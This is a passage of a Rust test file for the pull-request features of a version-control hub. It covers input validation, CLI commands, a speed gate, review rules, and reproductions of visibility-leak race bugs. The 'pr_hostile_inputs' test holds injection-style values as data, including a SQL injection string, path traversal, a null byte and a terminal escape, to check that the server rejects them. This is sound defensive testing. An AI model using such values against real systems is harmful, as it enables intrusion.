    th.rt.block_on(prs::close(&hub, &ask_of(&p.dev), &dev, &id)).unwrap();
    assert!(matches!(land(&p.dev), Err(Error::Api { code: "not_ready", .. })));
}

/// Hostile input on every PR input surface: ids, titles, bodies, search,
/// cursors, states, heads, sizes; and a hidden PR's id from another
/// project is no PR here.
#[test]
fn pr_hostile_inputs() {
    let th = TestHub::start();
    let (policy_text, bindings) = policy(1);
    let mut h = Hist::new(&th, &policy_text, &bindings);
    let root = root_snapshot_id();
    let mut base = Files::new();
    base.insert("pub/a.rs".into(), b"fn a() {}\n".to_vec());
    let b = h.commit(&th, &[root], base.clone(), [1; 16], 1_000, None);
    h.set_branch(&th, "main", b);
    let mut f = base;
    f.insert("pub/b.rs".into(), b"fn b() {}\n".to_vec());
    let head = h.commit(&th, &[b], f, [2; 16], 2_000, None);
    let (author, name) = person_row(&th, "author");
    let me = caller(author, &name);
    let admin = ask_as(&th, &h, &admin_of(author));
    let hub = h.hub.clone();
    let create = |head: &str, title: &str, body: Option<String>, onto: Option<&str>| {
        th.rt.block_on(prs::create(&hub, &admin, &me, CreatePr { head: head.into(), title: title.into(), body, onto: onto.map(str::to_string) }))
    };
    let bad = |r: veil_server::error::Result<Value>| matches!(r, Err(Error::Api { code: "bad_request" | "not_found", .. }));
    assert!(bad(create(&head.hex(), "", None, None)));
    assert!(bad(create(&head.hex(), "two\nlines", None, None)));
    assert!(bad(create(&head.hex(), "bell\u{7}", None, None)));
    assert!(bad(create(&head.hex(), &"t".repeat(301), None, None)));
    assert!(bad(create(&head.hex(), "big", Some("b".repeat((64 << 10) + 1)), None)));
    assert!(bad(create(&head.hex(), "esc", Some("\u{1b}[31m".into()), None)));
    assert!(bad(create("no-such-branch", "x", None, None)));
    assert!(bad(create(&"ab".repeat(32), "x", None, None)));
    assert!(bad(create(&head.hex(), "x", None, Some("no-such-branch"))));
    assert!(bad(create(&b.hex(), "already on main", None, None)));
    assert!(bad(create(&root.hex(), "the root", None, None)));
    let id = create(&head.hex(), "ok", None, None).unwrap()["id"].as_str().unwrap().to_string();
    assert!(veil_core::hub::pr::valid_pr_id(&id));
    // Ids: every malformed one, an unknown one and a hidden one answer alike.
    let anyone = ask_as(&th, &h, &Viewer::default());
    let missing = norm(th.rt.block_on(prs::show(&hub, &anyone, "pr-00000000")));
    for weird in ["", "pr-", "PR-0000000A", "pr-0000000g", "pr-00000000' OR 1=1 --", "pr-é0000000", &"pr-0".repeat(1000), "../../x", "pr-%00"] {
        assert_eq!(norm(th.rt.block_on(prs::show(&hub, &anyone, weird))), missing, "{weird:?}");
    }
    // Lists: states, searches with LIKE syntax, cursors, sizes.
    let list = |q: ListParams| th.rt.block_on(prs::list(&hub, &admin, q));
    assert!(bad(list(ListParams { state: Some("merged".into()), ..Default::default() })));
    assert!(bad(list(ListParams { q: Some("x".repeat(201)), ..Default::default() })));
    for c in ["", "1", "x:pr-00000000", "1:../x", "99999999999999999999:pr-00000000"] {
        assert!(bad(list(ListParams { after: Some(c.into()), ..Default::default() })), "{c}");
    }
    for q in ["%", "_", "\\", "%_%", "o_"] {
        assert_eq!(list(ListParams { q: Some(q.into()), ..Default::default() }).unwrap()["count"], 0, "{q}");
    }
    assert_eq!(list(ListParams { q: Some("OK".into()), n: Some(i64::MAX), ..Default::default() }).unwrap()["count"], 1);
    assert_eq!(list(ListParams { n: Some(-5), ..Default::default() }).unwrap()["prs"].as_array().unwrap().len(), 1);
    // Thread ids, bodies and states.
    let upd = |t: &str, q: prs::ThreadUpdate| th.rt.block_on(prs::update_thread(&hub, &admin, &me, &id, t, q));
    assert!(bad(upd("../x", prs::ThreadUpdate { body: Some("x".into()), state: None })));
    assert!(bad(upd("000000000000", prs::ThreadUpdate { body: Some("x".into()), state: None })));
    assert!(bad(th.rt.block_on(prs::new_thread(&hub, &admin, &me, &id, NewThread { body: "   ".into(), anchor: None }))));
    let v = th.rt.block_on(prs::new_thread(&hub, &admin, &me, &id, NewThread { body: "fine".into(), anchor: None })).unwrap();
    let t = v["id"].as_str().unwrap().to_string();
    assert!(bad(upd(&t, prs::ThreadUpdate { body: None, state: Some("deleted".into()) })));
    assert!(bad(upd(&t, prs::ThreadUpdate { body: None, state: None })));
    assert_eq!(upd(&t, prs::ThreadUpdate { body: None, state: Some("resolved".into()) }).unwrap()["state"], "resolved");
    // Anyone on Earth sees the public PR but cannot write to it.
    assert!(th.rt.block_on(prs::show(&hub, &anyone, &id)).is_ok());
    let nobody = Caller { person: None, epochs: Default::default() };
    assert!(matches!(th.rt.block_on(prs::new_thread(&hub, &anyone, &nobody, &id, NewThread { body: "spam".into(), anchor: None })), Err(Error::Api { code: "unauthorized", .. })));
    // A signed-in person who takes no part in the project reads it too, and
    // may not write to it either.
    let (outsider, oname) = person_row(&th, "outsider");
    let out_ask = ask_as(&th, &h, &Viewer { person: Some(outsider), ..Viewer::default() });
    assert!(th.rt.block_on(prs::show(&hub, &out_ask, &id)).is_ok());
    assert!(matches!(th.rt.block_on(prs::new_thread(&hub, &out_ask, &caller(outsider, &oname), &id, NewThread { body: "spam".into(), anchor: None })), Err(Error::Api { code: "forbidden", .. })));
    // The PR's id is no PR of another project.
    let other = Hist::new(&th, &policy_text, &bindings);
    let oask = ask_as(&th, &other, &admin_of(author));
    assert_eq!(norm(th.rt.block_on(prs::show(&hub, &oask, &id))), norm(th.rt.block_on(prs::show(&hub, &oask, "pr-00000000"))));
}

/// Through the routes and `vl pr`: create from a pushed tag, list, show,
/// diff, comment on a line, review (signed by the device), land's gate;
/// people who cannot see a touched folder get nothing, by name or count.
#[test]
fn vl_pr_commands() {
    let th = TestHub::start();
    let p = setup_project(&th);
    let dev_dir = p.dev.dir("clone");
    p.dev.clone_trusting(&th.url(&p.name), &dev_dir, &p.fp);
    write_files(&dev_dir, &[("src/feature.rs", "fn feature() {}\nfn more() {}\n")]);
    p.dev.ok(&dev_dir, &["commit", "--no-advance", "-m", "add the feature"]);
    p.dev.ok(&dev_dir, &["tag", "set", "feature-b1", "-r", "@-"]);
    p.dev.ok(&dev_dir, &["push"]);
    let out = p.dev.ok(&dev_dir, &["pr", "create", "feature-b1", "--title", "The feature", "--body", "Adds it."]);
    let id = out.split_whitespace().find(|w| veil_core::hub::pr::valid_pr_id(w.trim_matches(|c: char| !c.is_ascii_alphanumeric() && c != '-'))).map(|w| w.trim_matches(|c: char| !c.is_ascii_alphanumeric() && c != '-').to_string()).unwrap_or_else(|| panic!("{out}"));
    let list = p.dev.ok(&dev_dir, &["pr", "list"]);
    assert!(list.contains(&id) && list.contains("The feature"), "{list}");
    let show = p.dev.ok(&dev_dir, &["pr", "show", &id]);
    assert!(show.contains("Adds it.") && show.contains("normal"), "{show}");
    let diff = p.dev.ok(&dev_dir, &["pr", "diff", &id]);
    assert!(diff.contains("src/feature.rs") && diff.contains("+fn feature() {}"), "{diff}");
    p.dev.ok(&dev_dir, &["pr", "comment", &id, "--path", "src/feature.rs", "--line", "2", "-m", "why more?"]);
    let threads = p.dev.ok(&dev_dir, &["pr", "show", &id, "--threads"]);
    assert!(threads.contains("why more?") && threads.contains("src/feature.rs:2"), "{threads}");
    let json = p.dev.ok(&dev_dir, &["pr", "show", &id, "--json"]);
    let v: Value = serde_json::from_str(&json).unwrap();
    assert_eq!(v["id"], json!(id));
    // The admin reviews from their own clone (their device signs it).
    let r = p.admin.fails(&p.dir, &["pr", "land", &id]);
    assert!(r.contains("not ready") || r.contains("not_ready"), "{r}");
    p.admin.ok(&p.dir, &["pr", "review", &id, "--approve", "-m", "good"]);
    let r = p.admin.fails(&p.dir, &["pr", "land", &id]);
    assert!(r.contains("landing service"), "{r}");
    // The author cannot approve their own.
    let r = p.dev.fails(&dev_dir, &["pr", "review", &id, "--approve"]);
    assert!(r.contains("someone else"), "{r}");
    // A PR touching billing too: finance and admins see it; the dev's list,
    // count and search do not hold it, and its id is no PR for them.
    write_files(&p.dir, &[("src/both.rs", "fn both() {}\n"), (&format!("{BILL_DIR}/both.txt"), "billing side\n")]);
    p.admin.ok(&p.dir, &["commit", "--no-advance", "-m", "touches billing"]);
    p.admin.ok(&p.dir, &["tag", "set", "both-c1", "-r", "@-"]);
    p.admin.ok(&p.dir, &["push"]);
    let out = p.admin.ok(&p.dir, &["pr", "create", "both-c1", "--title", "Hidden title 5f1e", "--json"]);
    eprintln!("create --json printed: {out}");
    let hidden: Value = serde_json::from_str(out.lines().next().unwrap()).unwrap();
    let hidden_id = hidden["id"].as_str().unwrap();
    let dev_list = p.dev.ok(&dev_dir, &["pr", "list", "--all", "--json"]);
    let v: Value = serde_json::from_str(&dev_list).unwrap();
    assert_eq!(v["count"], 1, "{v}");
    assert!(!dev_list.contains("Hidden title") && !dev_list.contains(hidden_id), "{dev_list}");
    let r = p.dev.fails(&dev_dir, &["pr", "show", hidden_id]);
    let r2 = p.dev.fails(&dev_dir, &["pr", "show", "pr-00000000"]);
    assert_eq!(r.replace(hidden_id, "ID"), r2.replace("pr-00000000", "ID"));
    let search = p.dev.ok(&dev_dir, &["pr", "list", "--all", "--search", "5f1e", "--json"]);
    assert_eq!(serde_json::from_str::<Value>(&search).unwrap()["count"], 0);
    let fin_dir = p.fin.dir("clone");
    p.fin.clone_trusting(&th.url(&p.name), &fin_dir, &p.fp);
    let fin_list = p.fin.ok(&fin_dir, &["pr", "list", "--all"]);
    assert!(fin_list.contains("Hidden title 5f1e") && fin_list.contains("The feature"), "{fin_list}");
    // Anyone on Earth, through the API: the public PR only.
    let api = th.api();
    let v = api.get(None, &format!("/v1/projects/{}/prs?state=all", p.name)).json();
    assert_eq!(v["count"], 1, "{v}");
    assert_eq!(api.get(None, &format!("/v1/projects/{}/prs/{hidden_id}", p.name)).status, 404);
}

/// The speed gate (phase-4 design §7: 100,000 PRs in 50 visibility classes;
/// list, count and search for a restricted viewer under 50 ms; open and
/// update under 100 ms). Run on its own, through `bench-quiet.sh`.
#[test]
#[ignore = "speed gate: run with --ignored through bench-quiet.sh"]
fn pr_speed() {
    use std::time::{Duration, Instant};
    let th = TestHub::start();
    let (policy_text, bindings) = policy(1);
    // 50 classes need lines: 48 more folders, public or private.
    let mut text = policy_text.clone();
    for i in 0..48 {
        text.push_str(&format!("d{i:02}/ {}\n", if i % 2 == 0 { "public devs" } else { "finance" }));
    }
    let mut h = Hist::new(&th, &text, &bindings);
    let root = root_snapshot_id();
    let mut files = Files::new();
    for i in 0..48 {
        files.insert(format!("d{i:02}/a.rs"), format!("fn a{i}() {{}}\n").into_bytes());
    }
    files.insert("pub/a.rs".into(), b"fn a() {}\n".to_vec());
    let b = h.commit(&th, &[root], files.clone(), [1; 16], 1_000, None);
    h.set_branch(&th, "main", b);
    let (author, name) = person_row(&th, "author");
    let me = caller(author, &name);
    let admin = ask_as(&th, &h, &admin_of(author));
    let hub = h.hub.clone();
    let project = h.project(&th);
    // 100,000 PRs written straight into the tables, 2,000 per class.
    let key = prs::class::policy_key(&project.policy);
    let classes: Vec<(String, BTreeSet<String>)> = (0..50)
        .map(|i| {
            let lines: BTreeSet<String> = match i {
                48 => ["pub".to_string()].into(),
                49 => ["fin".to_string()].into(),
                _ => [format!("d{i:02}")].into(),
            };
            (prs::class::class_id(&key, &lines, ""), lines)
        })
        .collect();
    let t0 = Instant::now();
    th.rt.block_on(async {
        for (cid, lines) in &classes {
            sqlx::query("INSERT INTO pr_classes (project_id, class_id, policy_key, lines, embargo) VALUES ($1, $2, $3, $4, '') ON CONFLICT DO NOTHING")
                .bind(h.id).bind(cid).bind(&key).bind(serde_json::to_string(lines).unwrap()).execute(&hub.db).await.unwrap();
        }
        for chunk in 0..100 {
            let ids: Vec<String> = (0..1000).map(|i| format!("pr-{:08x}", chunk * 1000 + i)).collect();
            let cls: Vec<String> = (0..1000).map(|i| classes[(chunk * 1000 + i) % 50].0.clone()).collect();
            let titles: Vec<String> = (0..1000).map(|i| format!("change number {} in the speed run", chunk * 1000 + i)).collect();
            let at: Vec<i64> = (0..1000).map(|i| (chunk * 1000 + i) as i64).collect();
            sqlx::query(
                "INSERT INTO prs (project_id, id, class_id, policy_key, target, author, title, body, state, revision, risk, created_at, updated_at) \
                 SELECT $1, id, c, $2, 'main', $3, t, 'a body that says what the change is for', 'open', 1, 'normal', a, a \
                 FROM UNNEST($4::text[], $5::text[], $6::text[], $7::bigint[]) AS x(id, c, t, a)",
            )
            .bind(h.id).bind(&key).bind(author).bind(&ids).bind(&cls).bind(&titles).bind(&at)
            .execute(&hub.db).await.unwrap();
        }
    });
    println!("wrote 100,000 PRs in {:?}", t0.elapsed());
    // The steady state autovacuum keeps a table in (visibility map,
    // statistics), not that of rows just written.
    th.rt.block_on(sqlx::query("VACUUM ANALYZE prs").execute(&hub.db)).unwrap();
    let dev = ask_as(&th, &h, &Viewer { person: Some(800_001), groups: [900_001].into_iter().collect(), ..Viewer::default() });
    let pct = |mut v: Vec<Duration>, p: usize| {
        v.sort();
        v[(v.len() * p / 100).min(v.len() - 1)]
    };
    let time = |what: &str, n: usize, f: &dyn Fn() -> Value| -> (Duration, Duration) {
        f();
        let v: Vec<Duration> = (0..n).map(|_| { let t = Instant::now(); f(); t.elapsed() }).collect();
        let (p50, p99) = (pct(v.clone(), 50), pct(v, 99));
        println!("{what}: p50 {p50:?} p99 {p99:?}");
        (p50, p99)
    };
    let (l50, _) = time("list (a dev: 25 of 50 classes, 50,000 PRs)", 50, &|| th.rt.block_on(prs::list(&hub, &dev, ListParams::default())).unwrap());
    let (s50, _) = time("search", 50, &|| th.rt.block_on(prs::list(&hub, &dev, ListParams { q: Some("number 4242 ".into()), ..Default::default() })).unwrap());
    let v = th.rt.block_on(prs::list(&hub, &dev, ListParams::default())).unwrap();
    assert_eq!(v["count"], 50_000, "the dev satisfies the public classes and pub/");
    // Open (create) and update (a new revision), with real stacks.
    let mut n = 0u8;
    let mut heads = Vec::new();
    for i in 0..60u8 {
        let mut f = files.clone();
        f.insert(format!("pub/new-{i}.rs"), format!("fn n{i}() {{}}\n").into_bytes());
        heads.push(h.commit(&th, &[b], f.clone(), [10 + i; 16], 2_000 + i as i64, None));
        f.insert(format!("pub/new-{i}.rs"), format!("fn n{i}() {{ 2 }}\n").into_bytes());
        heads.push(h.commit(&th, &[b], f, [10 + i; 16], 3_000 + i as i64, None));
    }
    let mut opened = Vec::new();
    let mut opens = Vec::new();
    let mut updates = Vec::new();
    for pair in heads.chunks(2) {
        let t = Instant::now();
        let v = th.rt.block_on(prs::create(&hub, &admin, &me, CreatePr { head: pair[0].hex(), title: format!("open {n}"), ..Default::default() })).unwrap();
        opens.push(t.elapsed());
        let id = v["id"].as_str().unwrap().to_string();
        let t = Instant::now();
        th.rt.block_on(prs::add_revision(&hub, &admin, &me, &id, RevisionRequest { head: pair[1].hex() })).unwrap();
        updates.push(t.elapsed());
        opened.push(id);
        n += 1;
    }
    let (o50, o99, u50, u99) = (pct(opens.clone(), 50), pct(opens, 99), pct(updates.clone(), 50), pct(updates, 99));
    println!("open: p50 {o50:?} p99 {o99:?}; update: p50 {u50:?} p99 {u99:?}");
    let (sh50, _) = time("show", 50, &|| th.rt.block_on(prs::show(&hub, &dev, &opened[0])).unwrap());
    println!("GATE list {l50:?} search {s50:?} (< 50 ms); open {o50:?} update {u50:?} show {sh50:?} (< 100 ms)");
    let _ = HashMap::<(), ()>::new();
    let _ = BTreeMap::<(), ()>::new();
}

/// `.veilrules` `[review]` from the default branch's tip decides risk and
/// what each risk needs; a file that does not parse makes review stricter,
/// never weaker, and its text (an admin-only file) reaches admins only.
/// Embargoed changes are not PRs before S23.
#[test]
fn pr_rules_from_veilrules() {
    let th = TestHub::start();
    let (policy_text, bindings) = policy(1);
    let mut h = Hist::new(&th, &policy_text, &bindings);
    let root = root_snapshot_id();
    let mut base = Files::new();
    base.insert("pub/a.rs".into(), b"fn a() {}\n".to_vec());
    base.insert("pub/auth/login.rs".into(), b"fn login() {}\n".to_vec());
    base.insert(".veilrules".into(), b"[branches.main]\nprotected = true\n[review]\nnormal = { approvals = 2 }\nhigh_risk_paths = [\"pub/auth/\"]\n".to_vec());
    let b = h.commit(&th, &[root], base.clone(), [1; 16], 1_000, None);
    h.set_branch(&th, "main", b);
    let (author, name) = person_row(&th, "author");
    let me = caller(author, &name);
    let admin = ask_as(&th, &h, &admin_of(author));
    let dev = ask_as(&th, &h, &Viewer { person: Some(800_001), groups: [900_001].into_iter().collect(), ..Viewer::default() });
    let hub = h.hub.clone();
    let on = |h: &mut Hist, path: &str, n: u8| {
        let mut f = base.clone();
        f.insert(path.into(), format!("fn x{n}() {{}}\n").into_bytes());
        h.commit(&th, &[b], f, [10 + n; 16], 2_000 + n as i64, None)
    };
    let normal = on(&mut h, "pub/a.rs", 1);
    let high = on(&mut h, "pub/auth/login.rs", 2);
    let low = on(&mut h, "pub/docs/guide.md", 3);
    let mk = |head: ObjectId, t: &str| th.rt.block_on(prs::create(&hub, &admin, &me, CreatePr { head: head.hex(), title: t.into(), ..Default::default() })).unwrap();
    let v = mk(normal, "normal");
    let normal_id = v["id"].as_str().unwrap().to_string();
    assert_eq!((v["risk"].as_str(), v["review"]["needs"].clone()), (Some("normal"), json!({"approvals": 2, "people_only": false})));
    let v = mk(high, "high");
    assert_eq!((v["risk"].as_str(), v["review"]["needs"].clone()), (Some("high"), json!({"approvals": 1, "people_only": true})));
    assert!(v["reasons"][0].as_str().unwrap().contains("high_risk_paths"), "{v}");
    let v = mk(low, "low");
    assert_eq!((v["risk"].as_str(), v["review"]["needs"].clone()), (Some("low"), json!({"approvals": 0, "people_only": false})));
    assert_eq!(v["review"]["ready"], true, "low risk lands with checks alone");
    let id = v["id"].as_str().unwrap().to_string();
    // A broken file keeps the last valid rules (normal needs 2, never 1);
    // only admins read why.
    let mut broken = base.clone();
    broken.insert(".veilrules".into(), b"[review]\nlow = { approvals = 0 }\nsecret-key-name-77c1 = 3\nnormal = \"oops 5d2e\n".to_vec());
    let b2 = h.commit(&th, &[b], broken.clone(), [3; 16], 5_000, None);
    // Two later changes that keep it broken (the walk passes over them).
    let mut b3 = b2;
    for i in 0..2u8 {
        let mut f = broken.clone();
        f.insert(format!("pub/later-{i}.rs"), b"fn l() {}\n".to_vec());
        b3 = h.commit(&th, &[b3], f, [30 + i; 16], 5_100 + i as i64, None);
    }
    h.set_branch(&th, "main", b3);
    let a = th.rt.block_on(prs::show(&hub, &admin, &id)).unwrap();
    let d = th.rt.block_on(prs::show(&hub, &dev, &id)).unwrap();
    for v in [&a, &d] {
        assert_eq!(v["review"]["needs"], json!({"approvals": 0, "people_only": false}), "the last valid rules: {v}");
    }
    let n = th.rt.block_on(prs::show(&hub, &dev, &normal_id)).unwrap();
    assert_eq!(n["review"]["needs"], json!({"approvals": 2, "people_only": false}), "never lowered to one: {n}");
    assert!(a["review"]["reasons"].to_string().contains(".veilrules"), "{a}");
    let shown = d.to_string();
    assert!(!shown.contains("oops") && !shown.contains("5d2e") && !shown.contains("secret-key-name"), "{shown}");
    assert!(shown.contains("need an admin's attention"), "{shown}");
    // A project whose only .veilrules is broken: the strictest rules.
    let mut h2 = Hist::new(&th, &policy_text, &bindings);
    let mut f = Files::new();
    f.insert("pub/docs/a.md".into(), b"# a\n".to_vec());
    f.insert(".veilrules".into(), b"[review\n".to_vec());
    let c = h2.commit(&th, &[root], f.clone(), [1; 16], 1_000, None);
    h2.set_branch(&th, "main", c);
    f.insert("pub/docs/b.md".into(), b"# b\n".to_vec());
    let head2 = h2.commit(&th, &[c], f, [2; 16], 2_000, None);
    let admin2 = ask_as(&th, &h2, &admin_of(author));
    let v = th.rt.block_on(prs::create(&hub, &admin2, &me, CreatePr { head: head2.hex(), title: "strict".into(), ..Default::default() })).unwrap();
    assert_eq!((v["risk"].as_str(), v["review"]["needs"].clone()), (Some("low"), json!({"approvals": 1, "people_only": true})), "{v}");
    // An embargoed change (none can be pushed yet; written here) is no
    // revision anyone can open a PR from.
    let mut f = base.clone();
    f.insert("pub/fix.rs".into(), b"fn fix() {}\n".to_vec());
    let e = h.commit(&th, &[b3], f.clone(), [4; 16], 6_000, Some("embargo-1"));
    let above = h.commit(&th, &[e], f, [5; 16], 7_000, None);
    for head in [e, above] {
        let r = th.rt.block_on(prs::create(&hub, &admin, &me, CreatePr { head: head.hex(), title: "embargoed".into(), ..Default::default() }));
        assert!(matches!(r, Err(Error::Api { code: "not_found", .. })), "{r:?}");
    }
}

/// Security review of S21 cycle 1 (`docs/BUGS.md`, "S21 cycle 1"):
/// reproductions of BUG-1250..1254, ignored until fixed.
mod s21_adversarial {
    use std::time::{Duration, Instant};

    use super::*;

    const DEVS: i64 = 900_001;

    fn dev_viewer(person: i64) -> Viewer {
        Viewer { person: Some(person), groups: [DEVS].into_iter().collect(), ..Viewer::default() }
    }

    /// Wait until a statement starting with `prefix` waits for a lock
    /// (PostgreSQL shows it; YugabyteDB does not: there, give it 2 s).
    fn wait_for_lock(th: &TestHub, h: &Hist, prefix: &str) -> bool {
        let end = Instant::now() + Duration::from_secs(5);
        while Instant::now() < end {
            let n: i64 = th
                .rt
                .block_on(
                    sqlx::query_scalar("SELECT COUNT(*) FROM pg_stat_activity WHERE wait_event_type = 'Lock' AND query LIKE $1")
                        .bind(format!("{prefix}%"))
                        .fetch_one(&h.hub.db),
                )
                .unwrap_or(0);
            if n > 0 {
                return true;
            }
            std::thread::sleep(Duration::from_millis(20));
        }
        std::thread::sleep(Duration::from_secs(2));
        true
    }

    /// BUG-1250: a reclassification racing a new revision writes the class
    /// of the PR's old paths over the new revision's, so the PR shows to
    /// people who cannot read a folder its new revision touched.
    #[test]
    fn bug_1250_a_reclassification_racing_a_new_revision_shows_the_pr_to_people_who_cannot_see_it() {
        let th = TestHub::start();
        let (policy_text, bindings) = policy(1);
        let mut h = Hist::new(&th, &policy_text, &bindings);
        let root = root_snapshot_id();
        let mut base = Files::new();
        base.insert("pub/a.rs".into(), b"fn a() {}\n".to_vec());
        base.insert("fin/ledger.txt".into(), b"ledger\n".to_vec());
        let b = h.commit(&th, &[root], base.clone(), [1; 16], 1_000, None);
        h.set_branch(&th, "main", b);
        let mut f1 = base.clone();
        f1.insert("pub/b.rs".into(), b"fn b() {}\n".to_vec());
        let r1 = h.commit(&th, &[b], f1.clone(), [2; 16], 2_000, None);
        let mut f2 = f1;
        f2.insert("fin/ledger.txt".into(), b"ledger: payroll-7c41e9 moved\n".to_vec());
        let r2 = h.commit(&th, &[b], f2, [2; 16], 3_000, None);
        let (author, name) = person_row(&th, "author");
        let me = caller(author, &name);
        let admin = ask_as(&th, &h, &admin_of(author));
        let hub = h.hub.clone();
        let title = "quarterly-close-4be1d0";
        let id = th.rt.block_on(prs::create(&hub, &admin, &me, CreatePr { head: r1.hex(), title: title.into(), ..Default::default() })).unwrap()["id"]
            .as_str()
            .unwrap()
            .to_string();
        assert!(th.rt.block_on(prs::show(&hub, &ask_as(&th, &h, &dev_viewer(800_001)), &id)).is_ok(), "revision 1 touches pub/ only");
        // A second PR, made later (so after the first in the batch a
        // reclassification reads).
        let later = th.rt.block_on(prs::create(&hub, &admin, &me, CreatePr { head: r1.hex(), title: "later".into(), ..Default::default() })).unwrap()["id"]
            .as_str()
            .unwrap()
            .to_string();
        // The reclassification takes PRs in id order: the first it takes is
        // the one held, the other gets the revision.
        let (first, id) = if id < later { (id, later) } else { (later, id) };
        // Some request holds the first PR's row a moment (a thread, a
        // revision, a close).
        let mut blocker = th.rt.block_on(hub.db.begin()).unwrap();
        th.rt
            .block_on(sqlx::query("SELECT id FROM prs WHERE project_id = $1 AND id = $2 FOR UPDATE").bind(h.id).bind(&first).execute(&mut *blocker))
            .unwrap();
        // An admin adds an access line (the PRs' paths are decided as
        // before); a dev's list starts reclassifying both PRs, reading their
        // paths now, and waits at the first.
        th.rt.block_on(again(|| {
            sqlx::query("UPDATE projects SET policy_text = $1, policy_version = policy_version + 1 WHERE id = $2")
                .bind(format!("{policy_text}pub/zz/ security\n"))
                .bind(h.id)
                .execute(&hub.db)
        }));
        let dev = ask_as(&th, &h, &dev_viewer(800_001));
        let (hub3, dev3) = (hub.clone(), dev.clone());
        let listing = th.rt.spawn(async move { prs::list(&hub3, &dev3, ListParams::default()).await.map(|_| ()) });
        assert!(wait_for_lock(&th, &h, "UPDATE prs SET class_id"), "the reclassification waits for the first PR's row");
        // Meanwhile a request that loaded the project before the line came
        // (`admin`) adds revision 2 to the later PR, which also touches fin/.
        th.rt.block_on(prs::add_revision(&hub, &admin, &me, &id, RevisionRequest { head: r2.hex() })).unwrap();
        th.rt.block_on(blocker.rollback()).unwrap();
        th.rt.block_on(listing).unwrap().unwrap();

        // Revision 2 touched fin/, which the dev cannot read: the PR must
        // not exist for them.
        let shown = th.rt.block_on(prs::show(&hub, &dev, &id));
        let listed = th.rt.block_on(prs::list(&hub, &dev, ListParams::default())).unwrap();
        // (The first PR touched pub/ only: the dev rightly sees it.)
        let listed_ids: Vec<&str> = listed["prs"].as_array().unwrap().iter().map(|p| p["id"].as_str().unwrap()).collect();
        assert!(
            shown.is_err() && !listed_ids.contains(&id.as_str()) && listed["count"] == listed_ids.len(),
            "a PR whose revision 2 touched fin/ is shown to a dev: {}\nlist: {listed}",
            shown.map(|v| v.to_string()).unwrap_or_default()
        );
    }

    /// BUG-1250's class: every write of a visibility class is conditional
    /// on the inputs it was computed from. New revisions (some touching
    /// `fin/`), access-line changes and listings that reclassify, all at
    /// once, with requests holding the project as it was before or after
    /// each change: afterwards every class stored under the current lines
    /// is that of the PR's paths, and a dev sees exactly the PRs that never
    /// touched `fin/`.
    #[test]
    fn class_writes_race_revisions_and_access_lines() {
        let th = TestHub::start();
        let (policy_text, bindings) = policy(1);
        let mut h = Hist::new(&th, &policy_text, &bindings);
        let root = root_snapshot_id();
        let mut base = Files::new();
        base.insert("pub/a.rs".into(), b"fn a() {}\n".to_vec());
        base.insert("fin/ledger.txt".into(), b"ledger\n".to_vec());
        let b = h.commit(&th, &[root], base.clone(), [1; 16], 1_000, None);
        h.set_branch(&th, "main", b);
        let (author, name) = person_row(&th, "author");
        let me = caller(author, &name);
        let hub = h.hub.clone();
        let p0 = h.project(&th);
        let mut p1 = p0.clone();
        p1.policy_text = format!("{policy_text}pub/zz/ security\n");
        p1.policy = veil_core::hub::access::AccessPolicy::parse(&p1.policy_text);
        let ask_in = |p: &veil_server::perm::Project, v: Viewer| Ask { project: p.clone(), viewer: v, policy_version: 1 };
        // 8 PRs of 4 revisions each; the odd ones touch fin/ from revision 2.
        const PRS: u8 = 8;
        let mut heads: Vec<Vec<ObjectId>> = Vec::new();
        for k in 0..PRS {
            let mut hs = Vec::new();
            for r in 0..4u8 {
                let mut f = base.clone();
                f.insert(format!("pub/k{k}-{r}.rs"), format!("fn f{k}_{r}() {{}}\n").into_bytes());
                if k % 2 == 1 && r > 0 {
                    f.insert(format!("fin/k{k}-{r}.txt"), b"ledger line\n".to_vec());
                }
                hs.push(h.commit(&th, &[b], f, [100 + k; 16], 2_000 + (k as i64) * 10 + r as i64, None));
            }
            heads.push(hs);
        }
        let admin0 = ask_in(&p0, admin_of(author));
        let mut ids = Vec::new();
        for (k, hs) in heads.iter().enumerate() {
            let v = th.rt.block_on(prs::create(&hub, &admin0, &me, CreatePr { head: hs[0].hex(), title: format!("race {k}"), ..Default::default() })).unwrap();
            ids.push(v["id"].as_str().unwrap().to_string());
        }
        let projects = [p0.clone(), p1.clone()];
        th.rt.block_on(async {
            let mut set = tokio::task::JoinSet::new();
            for (k, id) in ids.iter().enumerate() {
                let (hub, me, id, hs, projects) = (hub.clone(), me.clone(), id.clone(), heads[k].clone(), projects.clone());
                set.spawn(async move {
                    for (r, head) in hs.iter().enumerate().skip(1) {
                        let a = Ask { project: projects[(k + r) % 2].clone(), viewer: admin_of(author), policy_version: 1 };
                        if let Err(e) = prs::add_revision(&hub, &a, &me, &id, RevisionRequest { head: head.hex() }).await {
                            // A request holding the lines from before a
                            // change may find the PR's class stale: no PR
                            // for it, for that moment (never a wrong one).
                            assert!(e.is_retryable() || matches!(e, Error::Api { code: "conflict" | "not_found", .. }), "{e:?}");
                        }
                        tokio::time::sleep(Duration::from_millis(3)).await;
                    }
                });
            }
            for t in 0..3usize {
                let (hub, projects) = (hub.clone(), projects.clone());
                set.spawn(async move {
                    for i in 0..30usize {
                        let a = Ask { project: projects[(t + i) % 2].clone(), viewer: dev_viewer(800_001), policy_version: 1 };
                        let _ = prs::list(&hub, &a, ListParams { state: Some("all".into()), ..Default::default() }).await;
                    }
                });
            }
            {
                let (hub, project, texts) = (hub.clone(), h.id, [p0.policy_text.clone(), p1.policy_text.clone()]);
                set.spawn(async move {
                    for i in 0..20usize {
                        let _ = sqlx::query("UPDATE projects SET policy_text = $1, policy_version = policy_version + 1 WHERE id = $2")
                            .bind(&texts[i % 2])
                            .bind(project)
                            .execute(&hub.db)
                            .await;
                        tokio::time::sleep(Duration::from_millis(4)).await;
                    }
                });
            }
            while let Some(r) = set.join_next().await {
                r.unwrap();
            }
        });
        for current in [&p0, &p1] {
            th.rt.block_on(again(|| sqlx::query("UPDATE projects SET policy_text = $1 WHERE id = $2").bind(&current.policy_text).bind(h.id).execute(&hub.db)));
            let dev = ask_in(current, dev_viewer(800_001));
            let v = th.rt.block_on(prs::list(&hub, &dev, ListParams { state: Some("all".into()), ..Default::default() })).unwrap();
            let mut seen: Vec<String> = v["prs"].as_array().unwrap().iter().map(|p| p["title"].as_str().unwrap().to_string()).collect();
            seen.sort();
            let want: Vec<String> = (0..PRS).filter(|k| k % 2 == 0).map(|k| format!("race {k}")).collect();
            assert_eq!(seen, want, "a dev sees exactly the PRs that never touched fin/");
            // Every class under the current lines is the PR's paths' class.
            let key = prs::class::policy_key(&current.policy);
